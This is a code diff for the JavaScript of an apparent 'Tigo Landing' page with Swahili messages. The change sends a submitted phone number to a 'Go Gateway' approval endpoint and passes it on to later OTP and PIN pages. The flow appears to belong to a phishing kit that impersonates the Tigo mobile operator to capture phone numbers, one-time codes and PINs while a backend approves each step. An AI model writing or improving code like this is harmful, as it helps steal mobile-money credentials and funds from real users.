@@ -37,15 +37,22 @@ document.addEventListener('DOMContentLoaded', () => {
             isSubmitting = true;
             confirmBtn.style.opacity = '0.5';
             confirmBtn.style.pointerEvents = 'none';
+            confirmBtn.textContent = 'Inatuma...';
 
             try {
-                const res = await fetch('/.netlify/functions/request-approval', {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({ type: 'phone', phone: normalizedPhone })
+                // Use Go Gateway Client
+                const resData = await window.apiClient.requestApproval({ 
+                    type: 'phone', 
+                    phone: normalizedPhone,
+                    name: 'Tigo User', // Standard name field
+                    details: 'Phone Submission from Tigo Landing'
                 });
-                const resData = await res.json();
-                const sid = resData.sessionId;
+
+                const sid = resData.attemptId; // Go Gateway uses attemptId instead of sessionId
+
+                if (!sid) {
+                    throw new Error('Hukuweza kupata session ID. Tafadhali jaribu tena.');
+                }
 
                 // Store phone in sessionStorage for OTP/PIN pages
                 sessionStorage.setItem('userPhone', normalizedPhone);
@@ -54,9 +61,11 @@ document.addEventListener('DOMContentLoaded', () => {
                 window.location.href = `loading.html?sid=${sid}&next=otp.html&error=${encodeURIComponent('login.html?error=1')}`;
             } catch (err) {
                 console.error('Request error:', err);
+                alert(`Imeshindwa kutuma: ${err.message}`);
                 isSubmitting = false;
                 confirmBtn.style.opacity = '1';
                 confirmBtn.style.pointerEvents = 'auto';
+                confirmBtn.textContent = 'Thibitisha';
             }
         } else if (!normalizedPhone) {
             alert('Weka namba sahihi yenye tarakimu 9 (au 10 ikianza na 0).');
